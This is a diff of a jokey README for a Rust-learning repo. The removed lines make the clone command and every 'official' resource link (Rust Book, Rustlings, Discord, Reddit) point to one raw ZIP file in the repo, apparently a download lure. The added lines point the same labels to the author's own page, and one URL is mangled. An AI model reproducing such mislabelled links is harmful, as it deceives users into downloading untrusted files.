@@ -17,7 +17,7 @@ Welcome to my **chaotic** journey into Rust! This repo is where I:
 ## 🛠 How to Run the Madness  
 Clone this repo if you dare:  
 ```sh
-git clone https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip
+git clone https://abdxl-cloud.github.io
 cd rusty-adventures
 cargo run
 ```
@@ -26,24 +26,24 @@ cargo run
 If you're also trying to tame the Rust beast, here are some resources that might save your sanity:  
 
 📚 **Official Docs & Books**  
-- [The Rust Book](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – The holy grail of Rust knowledge.  
-- [Rust by Example](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Hands-on learning with examples.  
-- [Rust Reference](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – For when you want to go full nerd mode.  
+- [The Rust Book](https://abdxl-cloud.github.io) – The holy grail of Rust knowledge.  
+- [Rust by Example](https://abdxl-cloud.github.io) – Hands-on learning with examples.  
+- [Rust Reference](https://abdxl-cloud.github.io) – For when you want to go full nerd mode.  
 
 🏋️ **Interactive & Practice**  
-- [Rustlings](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Fix tiny broken programs & learn Rust!  
-- [Exercism Rust Track](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Practice with real challenges.  
-- [LeetCode Rust](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – If you love suffering (a.k.a. coding challenges).  
+- [Rustlings](https://abdxl-cloud.github.io) – Fix tiny broken programs & learn Rust!  
+- [Exercism Rust Track](https://abdxl-cloud.github.io) – Practice with real challenges.  
+- [LeetCode Rust](https://abdxl-cloud.github.io) – If you love suffering (a.k.a. coding challenges).  
 
 🎥 **Videos & Tutorials**  
-- [Let’s Get Rusty (YouTube)](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip'sGetRusty) – Rust explained like you’re 5.  
-- [No Boilerplate (YouTube)](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Clean, concise Rust tutorials.  
-- [Rust Crash Course (Traversy Media)](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Learn Rust in one sitting.  
+- [Let’s Get Rusty (YouTube)](https://abdxl-cloud.github.io'sGetRusty) – Rust explained like you’re 5.  
+- [No Boilerplate (YouTube)](https://abdxl-cloud.github.io) – Clean, concise Rust tutorials.  
+- [Rust Crash Course (Traversy Media)](https://abdxl-cloud.github.io) – Learn Rust in one sitting.  
 
 💬 **Communities & Help**  
-- [Rust Users Forum](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Ask questions, get answers.  
-- [Rust Discord](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – Hang out with Rustaceans.  
-- [r/rust (Reddit)](https://github.com/abdxl-cloud/RustLearn/raw/refs/heads/main/my_first_project/src/Rust_Learn_v3.8.zip) – News, memes, and discussions.  
+- [Rust Users Forum](https://abdxl-cloud.github.io) – Ask questions, get answers.  
+- [Rust Discord](https://abdxl-cloud.github.io) – Hang out with Rustaceans.  
+- [r/rust (Reddit)](https://abdxl-cloud.github.io) – News, memes, and discussions.  
 
 ---
 
